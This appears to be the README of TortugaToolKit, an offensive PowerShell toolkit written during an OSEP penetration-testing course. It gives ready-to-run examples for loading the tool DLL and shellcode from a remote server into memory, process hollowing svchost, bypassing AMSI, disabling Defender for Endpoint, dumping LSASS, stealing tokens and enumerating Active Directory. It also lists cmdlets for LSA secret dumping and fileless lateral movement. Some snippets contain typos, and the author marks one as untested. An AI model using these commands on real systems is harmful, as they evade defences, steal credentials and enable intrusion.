# TortugaToolKit

Written during OSEP course, for learning purposes. Used heavily during the exam with much success. Thanks to all the open source projects out there that i was able to use and learn from.

## Examples

Load it

```powershell
$a=[System.Reflection.Assembly]::Load($(IWR -Uri http://yourserver/tortugatoolkit.dll -UseBasicParsing).Content);
Import-Module -Assembly $a

Untested but should work. maybe.
$test=((IWR -Uri 'http://yourserver/turtletoolkit.dll' -UseBasicParsing).RawContent);
$len=$test.length;$test.SubString($len-($len -198));$a=[System.Reflection.Assembly]::Load($test);
Import-Module -Assembly $a

```

Example of remotely loading and encrypting shellcode, then performing proc hollow with it
```powershell
$r = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
Invoke-ProcessHollow -procName 'svchost.exe' -k $r.encryptedKey -encsh $r.encryptedshellcode -ivk $.initVector
```
Example of performing ping sweep then admin check on subnet
```powershell
$s = Invoke-PingSweep -s "172.16.23.0";
foreach($h in $s){Invoke-AdminCheck -t $h}

Invoke-AdminCheck -h $(Invoke-PingSweep -s "172.16.75.0")
```
Example of impersonation via process token then running SharpView (or sharphound) as that domain user
```powershell
Invoke-TokenStealer -procH $false

Get-CurrentIdentity

Invoke-TurtleView -c "Get-DomainComputers";
Invoke-TurtleHound
```
Example of disabling amsi then disabling defender for endpoint and performing lsass process dump
```powershell
Disable-AyEmEsEye -Verbose
Disable-DefenderForEndpoint
Invoke-TurtleDump
Enable-DefenderForEndpint

```
Example of loading and executing a c# assembly
```powershell
Invoke-AssemblyLoader -e $false -l $false -path "http://ip/payload" -name namespace -clss targetclass -run method

```

## List of cmdlets

```
Disable-AyEmEsEye
Disable-DefenderForEndpoint
Disable-Etw
Enable-DefenderForEndpoint
Enable-Privileges
Get-ActiveDirectoryComputers
Get-ActiveDirectoryForests
Get-ActiveDirectoryGroupMembership
Get-ActiveDirectoryGroups
Get-ActiveDirectoryUsers
Get-CurrentIdentity
Get-MsSQLQuery
Get-SQLInfo
Get-System
Get-TrustedInstaller
Invoke-AdminCheck
Invoke-AssemblyLoader
Invoke-ClassicInjection
Invoke-FileLessLateralMovement
Invoke-LsaSecretsDmp
Invoke-MsSQLAssembly
Invoke-MsSQLShell
Invoke-PingSweep
Invoke-ProcessHollow
Invoke-ShellcodeEncryption
Invoke-TokenStealer
Invoke-TurtleDump
Invoke-TurtleHound
Invoke-TurtleUp
Invoke-TurtleView
Undo-Impersonation

```

## credits
Wouldnt be possible without these resources
* https://github.com/GhostPack/SharpUp
* https://github.com/tevora-threat/SharpView
* https://github.com/BloodHoundAD/SharpHound3
* https://devblogs.microsoft.com/scripting/use-powershell-to-decrypt-lsa-secrets-from-the-registry/
* https://github.com/clymb3r/PowerShell/blob/master/Invoke-TokenManipulation/Invoke-TokenManipulation.ps1
* https://www.exploit-db.com/exploits/13054
* https://github.com/latortuga71/latortugaDump
* https://github.com/b4rtik/ATPMiniDump
* https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/
* https://github.com/cobbr/SharpSploit
* https://medium.com/csis-techblog/silencing-microsoft-defender-for-endpoint-using-firewall-rules-3839a8bf8d18
* https://0x00-0x00.github.io/research/2018/10/21/Windows-API-And-Impersonation-Part-2.html
* https://github.com/latortuga71/DisableDefenderForEndpointPOC
* https://institute.sektor7.net/
* https://www.mike-gualtieri.com/posts/red-team-tradecraft-loading-encrypted-c-sharp-assemblies-in-memory
* https://dotnetninja.net/2020/03/creating-a-powershell-cmdlet-in-c/
* https://king-sabri.net/how-to-compile-embed-and-use-sharpsploit/
* https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html
* https://www.codeproject.com/articles/18102/howto-almost-everything-in-active-directory-via-c
* https://www.offensive-security.com/pen300-osep/


## Unlicense

```
This is free and unencumbered software released into the public domain.


Anyone is free to copy, modify, publish, use, compile, sell, or
distribute this software, either in source code form or as a compiled
binary, for any purpose, commercial or non-commercial, and by any
means.


In jurisdictions that recognize copyright laws, the author or authors
of this software dedicate any and all copyright interest in the
software to the public domain. We make this dedication for the benefit
of the public at large and to the detriment of our heirs and
successors. We intend this dedication to be an overt act of
relinquishment in perpetuity of all present and future rights to this
software under copyright law.


THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.

```

For more information, please refer to <http://unlicense.org/>
